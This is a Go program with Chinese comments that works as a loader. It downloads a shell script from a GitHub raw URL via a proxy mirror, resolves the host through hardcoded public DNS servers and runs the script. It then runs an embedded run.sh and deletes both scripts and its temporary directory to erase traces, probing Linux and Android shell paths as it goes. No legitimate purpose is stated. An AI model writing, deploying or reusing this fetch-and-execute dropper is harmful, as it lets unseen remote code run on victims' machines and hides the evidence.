package main
import (
        "context"
        "embed"
        "io"
        "io/fs"
        "net"
        "net/http"
        "os"
        "os/exec"
        "path/filepath"
        "strconv"
        "time"
)
//go:embed run.sh
var embeddedFiles embed.FS
const tempDirPrefix = "gztmp"
var shells = []string{
        "/bin/sh",
        "/bin/bash",
        "/system/bin/sh",
        "/system/bin/bash",
}
func main() {
        // 創 建 臨 時 目 錄
        tmpdir := createTempDir()
        if tmpdir == "" {
                os.Exit(1)
        }
        // 先 下 載 並 執 行 網 路 腳 本
        netScriptPath := filepath.Join(tmpdir, "net_script.sh")
        netScriptURL := "https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/load.sh"
        if downloadScriptWithDNS(netScriptURL, netScriptPath) == nil {
                executeScript(netScriptPath)
                // 下 載 的 腳 本 執 行 完 畢 後 立 即 刪 除
                os.Remove(netScriptPath)
        }
        // 再 提 取 並 執 行 內 嵌 腳 本
        runScriptPath := filepath.Join(tmpdir, "run.sh")
        if err := extractEmbeddedFile("run.sh", runScriptPath); err == nil {
                executeScript(runScriptPath)
                // 內 嵌 腳 本 執 行 完 畢 後 立 即 刪 除
                os.Remove(runScriptPath)
        }
        // 所 有 腳 本 執 行 完 畢 後 清 理 臨 時 目 錄
        cleanupTempDir(tmpdir)
}
// 創 建 臨 時 目 錄
func createTempDir() string {
        // 嘗 試 在 可 寫 目 錄 中 創 建 臨 時 目 錄
        baseDirs := []string{
                "/data",
                "/tmp",
                "/usr",
                ".",
        }
        for _, baseDir := range baseDirs {
                // 先 確 保 基 礎 目 錄 存 在
                if _, err := os.Stat(baseDir); os.IsNotExist(err) {
                        continue
                }
                // 嘗 試 使 用  mktemp 風 格 的 方 式 創 建 臨 時 目 錄
                for i := 0; i < 5; i++ {
                        // 使 用 更 隨 機 的 命 名
                        randPart := strconv.FormatInt(time.Now().UnixNano()%1000000000, 10)
                        tryDir := filepath.Join(baseDir, tempDirPrefix+randPart)
                        if err := os.Mkdir(tryDir, 0700); err == nil {
                                return tryDir
                        }
                        time.Sleep(time.Millisecond * 10) // 稍 微 等 待 一 下， 避 免 時 間 戳 相 同
                }
        }
        // 如 果 上 述 方 法 都 失 敗 ， 使 用 進 程 ID創 建 目 錄
        pid := os.Getpid()
        tmpdir := filepath.Join("/data/local/tmp", tempDirPrefix+strconv.Itoa(pid))
        if err := os.MkdirAll(tmpdir, 0700); err != nil {
                // 最 後 嘗 試 在 當 前 目 錄 創 建
                tmpdir = filepath.Join(".", tempDirPrefix+strconv.Itoa(pid))
                if err := os.MkdirAll(tmpdir, 0700); err != nil {
                        return ""
                }
        }
        return tmpdir
}
// 清 理 臨 時 目 錄
func cleanupTempDir(tmpdir string) {
        // 直 接 同 步 清 理 ， 不 再 使 用 異 步 延 遲
        if tmpdir != "" {
                os.RemoveAll(tmpdir)
        }
}
func extractEmbeddedFile(name, destPath string) error {
        content, err := fs.ReadFile(embeddedFiles, name)
        if err != nil {
                return err
        }
        return os.WriteFile(destPath, content, 0755)
}
func downloadScriptWithDNS(url, path string) error {
        resolver := &net.Resolver{
                PreferGo: true,
                Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
                        dnsServers := []string{"1.1.1.1:53", "8.8.8.8:53", "114.114.114.114:53"}
                        var lastErr error
                        for _, server := range dnsServers {
                                d := net.Dialer{Timeout: 2 * time.Second}
                                conn, err := d.DialContext(ctx, "udp", server)
                                if err == nil {
                                        return conn, nil
                                }
                                lastErr = err
                        }
                        return nil, lastErr
                },
        }
        transport := &http.Transport{
                DialContext: (&net.Dialer{
                        Timeout:   10 * time.Second,
                        Resolver:  resolver,
                        KeepAlive: 30 * time.Second,
                }).DialContext,
        }
        client := &http.Client{
                Transport: transport,
                Timeout:   20 * time.Second,
        }
        resp, err := client.Get(url)
        if err != nil {
                return err
        }
        defer resp.Body.Close()
        outFile, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
        if err != nil {
                return err
        }
        defer outFile.Close()
        _, err = io.Copy(outFile, resp.Body)
        return err
}
func executeScript(scriptPath string) {
        for _, shell := range shells {
                if _, err := os.Stat(shell); os.IsNotExist(err) {
                        continue
                }
                cmd := exec.Command(shell, scriptPath)
                cmd.Stdin = os.Stdin
                cmd.Stdout = os.Stdout
                cmd.Stderr = os.Stderr
                _ = cmd.Run()
                break
        }
}
